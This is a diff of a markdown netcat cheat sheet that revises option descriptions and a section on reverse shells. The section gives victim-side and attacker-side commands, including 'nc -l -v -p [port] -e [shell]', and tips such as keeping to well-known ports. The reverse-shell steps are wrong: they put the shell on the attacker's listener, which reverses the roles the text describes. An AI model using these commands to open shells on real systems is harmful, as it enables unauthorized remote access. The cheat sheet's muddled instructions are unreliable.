@@ -58,8 +58,8 @@ nc [{options} [arguments]...] [target-ip] [port-number]
 + -e [cmd] : Executes a command when connection is established; typicall is a shell (i.e. /bin/bash) for backdoor connections
 + -h : Display this help menu
 + -l : Start listener/server mode to connect from a remote system
-+ -n : Do not do any DNS or service lookups on any specific addresses, hostnames or ports
-+ -p [port-number] : Set a port number to listen through
++ -n : Do not do any DNS or service lookups on any specific addresses, hostnames or ports; No DNS - Only using IP Addresses
++ -p [port-number] : Set a port number to listen through; Try to keep it in the well known ports (< 1000)
 + -v : Verbose; Display detailed information of the standard output
 + -w [timeout] : Set connections to timeout after [timeout] seconds if cannot be established or are idle
 + -z : Specifies that nc should only scan for listening daemons, without sending any data to them; Cannot use with *-l*
@@ -90,11 +90,14 @@ nc [{options} [arguments]...] [target-ip] [port-number]
 		```
 
 - Connect from a remote target/victim system (Reverse Shell)
-	- On the target/victim system
+	- Connect to Listener (Attacker) system
+		+ On the target/victim system
 		```console
 		nc [target-ip-address] [port-number-to-connect]
 		```
-	- On the attacker system
+	- Start Listening Mode 
+		+ On the attacker system
+		+ To wait for the victim/target to activate a payload that will connect to this listener
 		```console
 		nc -l -v -p [port-number-to-listen] -e [shell]
 		```
